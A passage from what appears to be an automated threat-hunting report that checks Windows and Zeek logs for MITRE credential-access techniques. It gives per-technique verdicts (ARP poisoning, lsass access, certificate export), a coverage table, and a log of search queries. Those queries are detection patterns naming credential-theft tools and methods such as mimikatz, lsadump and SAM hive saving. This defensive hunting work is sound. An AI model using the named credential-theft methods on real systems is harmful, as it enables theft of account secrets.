| T1556.001 Domain Controller Authentication | benign | 4624 type-3 logons are machine-account (NEWYORK$/SCRANTON$) noise; 4648 explicit-credential logons reflect pbeesly credential reuse to NASHUA via PSEXESVC (lateral movement), not DC authentication modification. |
| T1556.002 Password Filter DLL | not_observed | No Notification Packages/PasswordFilter registry writes, no password-filter process creation, no password-filter script blocks; only legitimate Microsoft DLL loads (cryptdll/samlib/samcli). |
| T1556.005 Reversible Encryption | not_observed | No 4739 events, no Reversible/Set-ADUser/dsmod command lines, no AllowReversiblePasswordEncryption script blocks. |
| T1556.006 Multi-Factor Authentication | not_observed | No 4739/5136 events and no Set-ADUser/Set-ADAccountControl process creation; no MFA configuration changes. |
| T1556.007 Hybrid Identity | not_observed | No 5136 events and no Connect-MsolService/Connect-AzureAD script blocks; only legitimate AD module resource strings. |
| T1556.008 Network Provider DLL | not_observed | No NetworkProvider/Credential Provider registry writes and no NetworkProvider/New-ItemProperty script blocks. |
| T1557 Adversary-in-the-Middle | malicious | Two MACs (00:0d:3a:4d:42:f2 and fc:bd:67:e1:a9:c1) claim IP 10.0.1.4; the second appears only from 00:33:26 and exclusively targets 10.0.1.6 (NASHUA) on SMB/WinRM/RPC/HTTP, indicating on-path AiTM positioning. |
| T1557.001 Name Resolution Poisoning and SMB Relay | suspicious | Spoofed 10.0.1.4 drives SMB 445/WinRM 5985/RPC 135 to NASHUA with Kerberos TGS for cifs/NASHUA and HTTP/NASHUA (pbeesly), consistent with SMB relay/name-resolution poisoning, but no explicit relay tooling or LLMNR/NBT-NS… |
| T1557.002 ARP Cache Poisoning | malicious | A single IP (10.0.1.4) is claimed by a new MAC (fc:bd:67:e1:a9:c1) mid-capture while the legitimate MAC persists, the classic ARP cache poisoning / MAC takeover signature. |
| T1557.003 DHCP Spoofing | not_observed | No DHCP events in any dataset: no DHCP codes in windows.other, no dhcp log type in Zeek, and no DHCP PowerShell script blocks. |
| T1558 Steal or Forge Kerberos Tickets | malicious | PowerShell.exe on scranton opened lsass.exe with GrantedAccess 0x1fffff (PROCESS_ALL_ACCESS) with an UNKNOWN-module CallTrace, and a reflective shellcode loader script block executed on the same host minutes later — cred… |
| T1558.001 Golden Ticket | not_observed | Only normal krbtgt TGS requests (encryption type 0x12, status 0x0); no forged-ticket or RC4-downgrade indicators. |
| T1558.002 Silver Ticket | not_observed | Service-ticket requests are normal machine-account/krbtgt requests with matching TGTs; no silver-ticket behavior. |
| T1558.003 Kerberoasting | not_observed | No Kerberoast tooling in PowerShell logs and no burst of TGS requests to many SPNs in the zeek kerberos capture. |
| T1558.004 AS-REP Roasting | not_observed | AS exchanges show KDC_ERR_PREAUTH_REQUIRED (preauth enforced) — normal flow, not AS-REP roasting; no AS-REP tooling found. |
| T1606 Forge Web Credentials | not_observed | No forged web credential artifacts. The credential-related activity present (PowerShell.exe opening lsass.exe with 0x1FFFFF/0x1F3FFF and an obfuscated base64-shellcode PowerShell script as pbeesly on scranton) is credent… |
| T1606.001 Web Cookies | not_observed | Only cookie-path file event is a benign Windows INetCookies package file created by svchost.exe; no browser cookie theft/tampering or forged-cookie authentication. Zeek HTTP is WebDAV file transfer only. |
| T1606.002 SAML Tokens | not_observed | No SAML/ADFS/token/assertion references in process command lines, PowerShell script blocks, or HTTP URLs. Zeek window has no federated/web auth traffic; only a single NtLmSsp network logon consistent with post-theft late… |
| T1621 Multi-Factor Authentication Request Generatio… | not_observed | No MFA request generation artifacts: zero 4625 failed-logon events in windows.security (no repeated auth attempts), no MFA/2FA/Authenticator/multifactor strings in PowerShell 4104 script blocks, no mfa/authenticator/logi… |
| T1649 Steal or Forge Authentication Certificates | malicious | Certificate private-key export to .pfx (coyn5igj.3io.pfx) observed on scranton. |

## Coverage

Cells: number of hits of the planned checks, `n/a` (reason in report.json), or GAP.

| Technique | windows.other | windows.powershell | windows.security | windows.sysmon | zeek |
|---|---|---|---|---|---|
| T1003 OS Credential Dumping | 0 hits | 0 hits | 11437 hits | 39730 hits | n/a |
| T1003.001 LSASS Memory | 0 hits | 0 hits | 947 hits | 981 hits | n/a |
| T1003.002 Security Account Manager | 0 hits | 2 hits | 16 hits | 10 hits | n/a |
| T1003.003 NTDS | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1003.004 LSA Secrets | 0 hits | 0 hits | 0 hits | 327 hits | n/a |
| T1003.005 Cached Domain Credentials | 0 hits | 0 hits | 0 hits | 330 hits | n/a |
| T1003.006 DCSync | 90 hits | 0 hits | 21 hits | 0 hits | 9 hits |
| T1040 Network Sniffing | 5 hits | 0 hits | 460 hits | 0 hits | 0 hits |
| T1056 Input Capture | 90 hits | 0 hits | 21834 hits | 39609 hits | 0 hits |
| T1056.001 Keylogging | 5 hits | 0 hits | 10990 hits | 39779 hits | 0 hits |
| T1056.002 GUI Input Capture | 5 hits | 414 hits | 460 hits | 450 hits | 0 hits |
| T1056.003 Web Portal Capture | 5 hits | 0 hits | 5337 hits | 1649 hits | 0 hits |
| T1056.004 Credential API Hooking | 0 hits | 0 hits | 13 hits | 59963 hits | n/a |
| T1110 Brute Force | 2 hits | 0 hits | 0 hits | 30 hits | n/a |
| T1110.001 Password Guessing | 2 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1110.002 Password Cracking | 1 hits | 0 hits | 10977 hits | 346 hits | n/a |
| T1110.003 Password Spraying | 7 hits | 0 hits | 15 hits | 1 hits | n/a |
| T1110.004 Credential Stuffing | 4 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1111 Multi-Factor Authentication Interception | 2 hits | 0 hits | 312 hits | 39294 hits | n/a |
| T1187 Forced Authentication | 0 hits | 0 hits | 11140 hits | 1715 hits | 86 hits |
| T1212 Exploitation for Credential Access | 0 hits | 0 hits | 70 hits | 78566 hits | 14 hits |
| T1539 Steal Web Session Cookie | 0 hits | 0 hits | 465 hits | 40933 hits | 2 hits |
| T1552 Unsecured Credentials | 0 hits | 0 hits | 460 hits | 19208 hits | 12 hits |
| T1552.001 Credentials In Files | 0 hits | 0 hits | 312 hits | 2148 hits | 12 hits |
| T1552.002 Credentials in Registry | 3 hits | 1 hits | 1000 hits | 17606 hits | n/a |
| T1552.003 Shell History | 5 hits | 1 hits | 0 hits | 15 hits | n/a |
| T1552.004 Private Keys | 0 hits | 2 hits | 0 hits | 1 hits | n/a |
| T1552.006 Group Policy Preferences | 0 hits | 32 hits | 56 hits | 22 hits | n/a |
| T1555 Credentials from Password Stores | 2 hits | 5 hits | 19 hits | 1326 hits | n/a |
| T1555.003 Credentials from Web Browsers | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1555.004 Windows Credential Manager | 2 hits | 0 hits | 0 hits | 652 hits | n/a |
| T1555.005 Password Managers | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1556 Modify Authentication Process | 0 hits | 0 hits | 0 hits | 729 hits | n/a |
| T1556.001 Domain Controller Authentication | 0 hits | 0 hits | 545 hits | 359 hits | n/a |
| T1556.002 Password Filter DLL | 10 hits | 0 hits | 0 hits | 33 hits | n/a |
| T1556.005 Reversible Encryption | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1556.006 Multi-Factor Authentication | 0 hits | 1 hits | 0 hits | 0 hits | n/a |
| T1556.007 Hybrid Identity | 0 hits | 0 hits | 594 hits | 20259 hits | n/a |
| T1556.008 Network Provider DLL | 4 hits | 0 hits | 36 hits | 59543 hits | n/a |
| T1557 Adversary-in-the-Middle | 2 hits | 0 hits | 21954 hits | 1310 hits | 1226 hits |
| T1557.001 Name Resolution Poisoning and SMB Relay | 2 hits | 0 hits | 23 hits | 1310 hits | 53 hits |
| T1557.002 ARP Cache Poisoning | 2 hits | 0 hits | 10977 hits | 1310 hits | 1226 hits |
| T1557.003 DHCP Spoofing | 216 hits | 0 hits | 0 hits | 1229 hits | 2140 hits |
| T1558 Steal or Forge Kerberos Tickets | 9 hits | 0 hits | 745 hits | 39609 hits | 35 hits |
| T1558.001 Golden Ticket | 216 hits | 0 hits | 268 hits | 39283 hits | 35 hits |
| T1558.002 Silver Ticket | 9 hits | 0 hits | 268 hits | 326 hits | 35 hits |
| T1558.003 Kerberoasting | 216 hits | 0 hits | 368 hits | 39283 hits | 35 hits |
| T1558.004 AS-REP Roasting | 216 hits | 0 hits | 42 hits | 447 hits | 35 hits |
| T1606 Forge Web Credentials | 90 hits | 0 hits | 312 hits | 326 hits | 475 hits |
| T1606.001 Web Cookies | 9 hits | 0 hits | 312 hits | 1 hits | 62 hits |
| T1606.002 SAML Tokens | 90 hits | 0 hits | 312 hits | 0 hits | 0 hits |
| T1621 Multi-Factor Authentication Request Generatio… | 85 hits | 0 hits | 0 hits | 0 hits | 0 hits |
| T1649 Steal or Forge Authentication Certificates | 90 hits | 0 hits | 50 hits | 1133 hits | 378 hits |

Cells: 265, gaps: 0.

## Queries

Every MCP tool call of this run (1162), in order (source: mcp_audit.jsonl written by the MCP server).

| Query | Phase | Tool | Arguments | Hits / rows | Cited by |
|---|---|---|---|---|---|
| q-62e37ce88f | scope | list_data_sources | {} | None |  |
| q-36b3936ca2 | scope | get_registry | {} | None |  |
| q-6b139165a2 | scope | get_fields | {"dataset": "windows.other", "prefix": ""} | None |  |
| q-a9b5fc4154 | scope | get_fields | {"dataset": "windows.powershell", "prefix": ""} | None |  |
| q-7ff05e4bdd | scope | get_fields | {"dataset": "windows.security", "prefix": ""} | None |  |
| q-21fc9b9d25 | scope | get_fields | {"dataset": "windows.sysmon", "prefix": ""} | None |  |
| q-512026a42a | scope | get_fields | {"dataset": "zeek", "prefix": ""} | None |  |
| q-0366a86950 | check C001 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 447 |  |
| q-11ec06a3bd | check C002 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-f7179174cd | check C003 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:(4656 OR 4663 OR 4670)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-1b59e468f2 | check C004 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 460 |  |
| q-584e59c9ac | check C005 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*lsass* OR powershell.script_block_text:*mimikatz* OR powershell.script_block_text:*sekurlsa* OR powershell.script_block_text:*DumpCreds*)", "time_from": null, "time_… | 0 |  |
| q-1ec2d3d777 | check C006 | search | {"dataset": "windows.other", "query": "message:(*lsass* OR *mimikatz* OR *sekurlsa* OR *procdump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "p… | 0 |  |
| q-b222f09b37 | check C007 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-fd83d73440 | check C008 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-683f841f9c | check C009 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-dfe4fc46eb | check C010 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*lsass* OR file.path:*.dmp)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pro… | 2 | F01, F04 |
| q-99200c342f | check C011 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*lsass* OR process.command_line:*comsvcs* OR process.command_line:*MiniDump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 1 |  |
| q-9896ed349d | check C012 | search | {"dataset": "windows.sysmon", "query": "event.code:(13 OR 14) AND registry.path:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 0 |  |
| q-9fa5f69920 | check C013 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4673", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 934 |  |
| q-0d39913fae | check C014 | search | {"dataset": "windows.security", "query": "event.code:4656 AND win.ObjectName:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command… | 13 |  |
| q-1a9c6e892d | check C015 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*lsass* OR powershell.script_block_text:*MiniDump* OR powershell.script_block_text:*Invoke-Mimikatz*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "… | 0 |  |
| q-5305ebde00 | check C016 | search | {"dataset": "windows.other", "query": "message:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 0 |  |
| q-85401320d7 | check C017 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*SAM* OR file.path:*SECURITY* OR file.path:*SYSTEM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "… | 3 | F02 |
| q-2ab534db23 | check C018 | search | {"dataset": "windows.sysmon", "query": "event.code:(13 OR 14) AND (registry.path:*SAM* OR registry.path:*SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "proces… | 7 |  |
| q-bed964fb94 | check C019 | search | {"dataset": "windows.sysmon", "query": "event.code:2 AND (process.command_line:*SAM* OR process.command_line:*reg*save*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "p… | 0 |  |
| q-35361a06c7 | check C020 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*reg save* OR process.command_line:*save*hklm* OR process.command_line:*SAM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 0 |  |
| q-02f7471d09 | check C021 | aggregate | {"dataset": "windows.security", "field": "process.command_line", "query": "event.code:4688 AND (process.command_line:*reg* OR process.command_line:*save*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 6 |  |
| q-f6419b5d2f | check C022 | search | {"dataset": "windows.security", "query": "event.code:(4656 OR 4663) AND (win.ObjectName:*SAM* OR win.ObjectName:*SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name",… | 10 |  |
| q-bb2e595336 | check C023 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*SAM* OR powershell.script_block_text:*reg save* OR powershell.script_block_text:*hive*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "… | 2 |  |
| q-dd9f56e226 | check C024 | search | {"dataset": "windows.other", "query": "message:(*SAM* OR *SECURITY hive* OR *reg save*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 0 |  |
| q-b6b82645c1 | check C025 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*ntds* OR file.path:*NTDS*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pro… | 0 |  |
| q-c03a9a94fc | check C026 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*ntds* OR process.command_line:*vssadmin* OR process.command_line:*ntdsutil* OR process.command_line:*diskshadow*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "ho… | 0 |  |
| q-4f1c44106c | check C027 | search | {"dataset": "windows.sysmon", "query": "event.code:2 AND file.path:*ntds*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 0 |  |
| q-0cb7bd899f | check C028 | aggregate | {"dataset": "windows.security", "field": "process.command_line", "query": "event.code:4688 AND (process.command_line:*ntds* OR process.command_line:*vssadmin* OR process.command_line:*diskshadow*)", "time_from": null, "time_to": null, "size": 50, "sub_field": … | 0 |  |
| q-237a640096 | check C029 | search | {"dataset": "windows.other", "query": "message:(*shadow* OR *VSS* OR *ntds*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-c81982d5ae | check C030 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*ntds* OR powershell.script_block_text:*diskshadow* OR powershell.script_block_text:*vssadmin*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.n… | 0 |  |
| q-c3de02ec56 | check C031 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-c89977e3a1 | check C032 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*secrets* OR process.command_line:*lsadump* OR process.command_line:*reg save*HKLM\\\\SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observe… | 0 |  |
| q-d728c849b4 | check C033 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND win.ImageLoaded:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 1 |  |
| q-5735094087 | check C034 | search | {"dataset": "windows.security", "query": "event.code:(4656 OR 4663 OR 4670) AND win.ObjectName:*SECURITY*Policy*Secrets*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "p… | 0 |  |
| q-a3c1393bba | check C035 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:(4656 OR 4663 OR 4670) AND win.ObjectName:*Secrets*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-7eb9b6865f | check C036 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Secrets* OR powershell.script_block_text:*lsadump* OR powershell.script_block_text:*LSA*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name",… | 0 |  |
| q-7c9ec8d3ae | check C037 | search | {"dataset": "windows.other", "query": "message:(*Secrets* OR *LSA* OR *lsadump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 0 |  |
| q-83b0193b86 | check C038 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-f92fc16d59 | check C039 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*cache* OR process.command_line:*DCC2* OR process.command_line:*mscache* OR process.command_line:*cachedump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.na… | 4 |  |
| q-58061d9efd | check C040 | search | {"dataset": "windows.security", "query": "event.code:(4656 OR 4663 OR 4670) AND (win.ObjectName:*Cache* OR win.ObjectName:*SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "u… | 0 |  |
| q-0723295dac | check C041 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:(4656 OR 4663 OR 4670) AND win.ObjectName:*Cache*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-7105947ca8 | check C042 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*cache* OR powershell.script_block_text:*DCC2* OR powershell.script_block_text:*mscache*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", … | 0 |  |
| q-5d870ba65d | check C043 | search | {"dataset": "windows.other", "query": "message:(*cached*credential* OR *mscache* OR *DCC2*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-468a5b20f9 | check C044 | count | {"dataset": "windows.security", "query": "event.code:4662", "time_from": null, "time_to": null} | 7 |  |
| q-7bdb06cdb0 | check C045 | aggregate | {"dataset": "windows.security", "field": "win.AccessMask", "query": "event.code:4662", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 7 |  |
| q-86cce9779e | check C046 | aggregate | {"dataset": "windows.security", "field": "win.SubjectUserName", "query": "event.code:4662", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 7 |  |
| q-1c551ba74f | check C047 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*drsuapi* OR process.command_line:*lsadump* OR process.command_line:*dcsync*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 0 |  |
| q-de5c9b9d43 | check C048 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*DCSync* OR powershell.script_block_text:*lsadump* OR powershell.script_block_text:*drsuapi*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.nam… | 0 |  |
| q-dc5b7741db | check C049 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5858 OR event.code:5857", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-4d7ddd390b | check C050 | search | {"dataset": "zeek", "query": "event.action:dce_rpc AND (zeek.operation:*DRSUAPI* OR zeek.endpoint:*drsuapi* OR zeek.named_pipe:*drsuapi*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code"… | 9 |  |
| q-571bdfa30a | check C051 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 460 |  |
| q-d14865f058 | check C052 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*pcap* OR process.command_line:*sniff* OR process.command_line:*promisc*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.da… | 0 |  |
| q-073c9ea968 | check C053 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-499f0b914d | check C054 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*tcpdump* OR process.executable:*windump* OR process.executable:*wireshark* OR process.executable:*rawcap* OR process.executable:*npcap*)", "time_from": null, "time_to": null, "fields… | 0 |  |
| q-28d93b0768 | check C055 | search | {"dataset": "windows.sysmon", "query": "event.code:6 AND (win.Image:*npcap* OR win.Image:*pcap* OR win.Image:*winpcap*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 0 |  |
| q-a4deedacc1 | check C056 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*pcap* OR powershell.script_block_text:*sniff* OR powershell.script_block_text:*promiscuous*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.nam… | 0 |  |
| q-c7509c316c | check C057 | search | {"dataset": "zeek", "query": "event.action:conn AND network.transport:icmp", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "s… | 0 |  |
| q-b27d74bfaa | check C058 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-ddadfb7cd4 | check C059 | aggregate | {"dataset": "windows.security", "field": "win.AccessMask", "query": "event.code:4656 OR event.code:4663", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10834 |  |
| q-6cdf31fe14 | check C060 | search | {"dataset": "windows.security", "query": "event.code:4656 AND (win.ObjectName:*lsass* OR win.ObjectName:*credential* OR win.ObjectName:*SAM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.c… | 23 |  |
| q-ffd4b99c39 | check C061 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-db3c4ec007 | check C062 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-3ce5031b50 | check C063 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1010 OR win.GrantedAccess:0x1410 OR win.GrantedAccess:0x1438 OR win.GrantedAccess:0x143a)", "time_from": null, "time_to": null, "fields": ["@timestamp", … | 0 |  |
| q-26e599987c | check C064 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Get-Credential* OR powershell.script_block_text:*CredentialManager* OR powershell.script_block_text:*keylog*)", "time_from": null, "time_to": null, "fields": ["@time… | 0 |  |
| q-49f9335625 | check C065 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5858 OR event.code:5857", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-df346b7a55 | check C066 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:POST", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-7b5f4e2a5c | check C067 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-982b80373e | check C068 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*winlogon* OR win.TargetImage:*explorer*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event… | 470 |  |
| q-d4942f3e2f | check C069 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND (registry.path:*Keyboard* OR registry.path:*keylog* OR registry.path:*Scancode*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code… | 26 |  |
| q-8010fa2aec | check C070 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*keylog* OR process.command_line:*GetAsyncKeyState* OR process.command_line:*SetWindowsHookEx*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer… | 0 |  |
| q-e1b7d3233d | check C071 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-082b24f75b | check C072 | search | {"dataset": "windows.security", "query": "event.code:4656 AND (win.ObjectName:*lsass* OR win.ObjectName:*winlogon*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "proces… | 13 |  |
| q-34fb2e8db0 | check C073 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-e0cf83cf04 | check C074 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*keylog* OR powershell.script_block_text:*GetAsyncKeyState* OR powershell.script_block_text:*SetWindowsHookEx*)", "time_from": null, "time_to": null, "fields": ["@tim… | 0 |  |
| q-3ab3d4cca1 | check C075 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:POST", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-84f342dd7c | check C076 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Credential* OR powershell.script_block_text:*Prompt* OR powershell.script_block_text:*Read-Host*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "hos… | 0 |  |
| q-54d175d5ca | check C077 | aggregate | {"dataset": "windows.powershell", "field": "win.ScriptBlockId", "query": "event.code:4104", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 414 |  |
| q-401532ee42 | check C078 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*Credential* OR process.command_line:*prompt* OR process.command_line:*consent*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.… | 3 |  |
| q-26fa8f3101 | check C079 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 447 |  |
